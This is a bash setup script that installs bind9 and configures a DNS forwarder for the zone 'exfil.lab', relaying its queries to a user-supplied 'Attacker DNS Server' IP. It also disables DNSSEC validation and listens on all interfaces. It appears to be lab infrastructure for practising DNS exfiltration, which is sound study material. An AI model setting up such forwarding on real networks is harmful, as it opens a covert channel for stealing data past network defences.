#!/bin/bash

if [ "$EUID" -ne 0 ]; then
    echo "[!] Please run this script with sudo"
    exit 1
fi

echo "[*] Setting up DNS Forwarder..."
read -p "Enter the IP address of the Attacker DNS Server: " ATTACKER_IP

apt update
apt install -y bind9

# Configure forwarding zone
tee /etc/bind/named.conf.local > /dev/null <<EOF
zone "exfil.lab" {
    type forward;
    forwarders { ${ATTACKER_IP}; };
};
EOF

# Global options
tee /etc/bind/named.conf.options > /dev/null <<EOF
options {
    directory "/var/cache/bind";
    forwarders {
        8.8.8.8;
    };
    dnssec-validation no;
    auth-nxdomain no;
    listen-on { any; };
};
EOF

systemctl restart bind9

echo "[+] DNS Forwarder ready. exfil.lab"
